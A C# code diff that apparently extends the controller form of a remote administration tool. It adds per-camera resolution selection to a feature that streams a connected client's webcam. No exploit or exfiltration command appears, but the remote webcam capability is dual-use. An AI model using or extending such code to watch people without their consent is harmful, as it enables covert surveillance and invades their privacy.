@@ -9,11 +9,15 @@ using xServer.Core.Utilities;
 using xServer.Enums;
 namespace xServer.Forms
 {
+    using System.Linq;
+
     public partial class FrmRemoteWebcam : Form
     {
 
         public bool IsStarted { get; private set; }
         private readonly Client _connectClient;
+        private Dictionary<string, List<Size>> Webcams;
+
         public FrmRemoteWebcam(Client c)
         {
             _connectClient = c;
@@ -52,14 +56,17 @@ namespace xServer.Forms
             if (_connectClient.Value != null)
                 new Core.Packets.ServerPackets.GetWebcams().Execute(_connectClient);
         }
-        public void AddWebcams(List<string> names)
+        public void AddWebcams(Dictionary<string, List<Size>> webcams)
         {
+            this.Webcams = webcams;
             try
             {
                 cbWebcams.Invoke((MethodInvoker)delegate
                 {
-                    for (int i = 0; i < names.Count; i++)
-                        cbWebcams.Items.Add(string.Format("{0}",names[i]));
+                    foreach (var webcam in webcams.Keys)
+                    {
+                        cbWebcams.Items.Add(string.Format("{0}", webcam));
+                    }
                     cbWebcams.SelectedIndex = 0;
                 });
             }
@@ -69,8 +76,6 @@ namespace xServer.Forms
         }
         public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
         {
-
-
             picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
         }
 
@@ -87,14 +92,14 @@ namespace xServer.Forms
 
             this.ActiveControl = picWebcam;
 
-            new Core.Packets.ServerPackets.GetWebcam(cbWebcams.SelectedIndex).Execute(_connectClient);
+            new Core.Packets.ServerPackets.GetWebcam(cbWebcams.SelectedIndex, cbResolutions.SelectedIndex).Execute(_connectClient);
         }
 
         public void ToggleControls(bool state)
         {
             IsStarted = !state;
 
-            cbWebcams.Enabled = btnStart.Enabled = state;
+            cbWebcams.Enabled = cbResolutions.Enabled = btnStart.Enabled = state;
             btnStop.Enabled = !state;
         }
 
@@ -118,6 +123,19 @@ namespace xServer.Forms
             this.ActiveControl = picWebcam;
 
             new Core.Packets.ServerPackets.DoWebcamStop().Execute(_connectClient);
+        }
+
+        private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            cbResolutions.Invoke((MethodInvoker)delegate
+            {
+                cbResolutions.Items.Clear();
+                foreach (var resolution in this.Webcams.ElementAt(cbWebcams.SelectedIndex).Value)
+                {
+                    cbResolutions.Items.Add(string.Format("{0} x {1}", resolution.Width, resolution.Height));
+                }
+                cbResolutions.SelectedIndex = 0;
+            });
         }
     }
 }
